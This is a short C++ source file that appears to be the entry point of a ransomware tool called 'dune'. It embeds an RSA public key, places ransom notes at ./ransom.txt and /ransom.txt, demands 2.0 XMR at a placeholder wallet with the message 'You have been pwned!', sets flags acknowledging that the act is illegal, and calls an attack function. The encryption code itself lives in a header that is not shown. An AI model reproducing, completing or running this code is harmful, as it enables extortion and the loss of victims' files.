#include <iostream>
#include <vector>
#include <thread>
#include <string>
#include <chrono>
#include "inc/dune.hpp"

enum OP_MODE
{
    DUNE_SERVER,
    DUNE_CLIENT
};

int main(int argc, char *argv[])
{
    std::vector<std::string> notes;
    notes.push_back("./ransom.txt");
    notes.push_back("/ransom.txt");
    std::string public_key = "-----BEGIN PUBLIC KEY-----\n"
                             "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC3LhafKJnVq/xa/1d40hcETsyG\n"
                             "CLSxlhXfJWERLPY14Di6EyKZj+e7+IpZF489pxnDEode2UaN/Mq0/hCy8epOrfx1\n"
                             "0BKGlxY72fPDt9MvThCs6DokeK4cIzcMEKQv4RNBF8q3winAM1SGnxLu7RWx2npF\n"
                             "ND8Xa8c7d8il4AjK5QIDAQAB\n"
                             "-----END PUBLIC KEY-----\n";
    dune::Dune dune = dune::Dune(2.0, "XMR", "your address here", "You have been pwned!", notes, "tech@anon.gov", public_key);
    dune::Acknowledgement ack;
    ack.are_you_sure_you_want_to_do_this = true;
    ack.i_accept_the_risks_and_consequences_of_my_actions = true;
    ack.i_understand_it_is_illegel = true;
    dune.attack(ack);

    
    return 0;
}